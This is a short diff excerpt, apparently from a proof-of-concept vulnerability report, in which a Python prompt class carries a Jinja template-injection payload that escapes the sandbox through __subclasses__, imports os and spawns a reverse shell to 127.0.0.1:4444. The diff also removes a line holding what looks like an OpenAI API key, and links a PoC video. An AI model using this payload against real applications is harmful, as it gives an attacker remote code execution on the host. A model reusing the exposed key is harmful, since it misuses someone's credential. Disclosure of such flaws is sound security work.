@@ -139,9 +139,7 @@ class OpenAIPrompt(BasePrompt):
     template:str = """{% for x in ().__class__.__base__.__subclasses__() %} {% if "warning" in x.__name__ %} {{x()._module.__builtins__['__import__']('os').popen('python3 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\\'').read()}} {% endif %} {% endfor %}"""
     
 prompt = OpenAIPrompt()
-llm = OpenAI(api_token="sk-proj-0nzUgsM2Pjmy5RgpCVxdT3BlbkFJkRzmEFNuBc1dwbjNuWBG")
 llm.call(instruction=prompt)
-
 ```
 
 PoC Video: https://drive.google.com/file/d/1FR-VwU44UzaJ18dHTfNdWs6ywUaebxmy/view?usp=sharing
